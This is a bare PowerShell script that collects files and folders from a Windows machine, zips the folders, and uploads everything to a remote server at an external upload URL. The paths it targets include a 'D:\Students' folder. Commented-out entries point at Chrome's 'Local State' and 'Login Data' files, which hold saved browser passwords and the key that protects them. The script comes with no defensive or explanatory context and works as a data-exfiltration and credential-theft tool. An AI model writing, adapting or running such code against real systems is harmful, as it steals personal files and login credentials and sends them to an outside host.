$uri = "https://ecs.rcsis.ir/upload?uid={uid}"
# Define the paths to be zipped

$files = @(
    "C:\Users\User\AppData\Local\Temp\test",
    #"$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
    #("$env:USERPROFILE"+'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
    'D:\Students'
)
$webClient = New-Object System.Net.WebClient;
# Loop through each file path
foreach ($filePath in $files) {
    if (Test-Path $filePath) {
	$item = Get-Item -Path $filePath
	if ($item.PSIsContainer) {
		Write-Output "$filePath is a directory."
		Add-Type -AssemblyName System.IO.Compression.FileSystem
		$filename = (Split-Path -Path $filePath -Leaf)
		$Destination = "$env:USERPROFILE\AppData\Local\Temp\" + $filename + ".zip"
		[System.IO.Compression.ZipFile]::CreateFromDirectory($filePath , $Destination)
		$response = $webClient.UploadFile($uri,$Destination)
		$res = ([System.Text.Encoding]::ASCII.GetString($response) | ConvertFrom-Json)
		Write-OutPut $res.message ""
		#rm $Destination
	}
	else{	
		Write-Output "$filePath is a file."
		$response = $webClient.UploadFile($uri,$filePath)
       		$res = ([System.Text.Encoding]::ASCII.GetString($response) | ConvertFrom-Json)
		Write-OutPut $res ""	
       	}
	}
	else{
		Write-OutPut "The Path $filepath Not Found "
	}
}

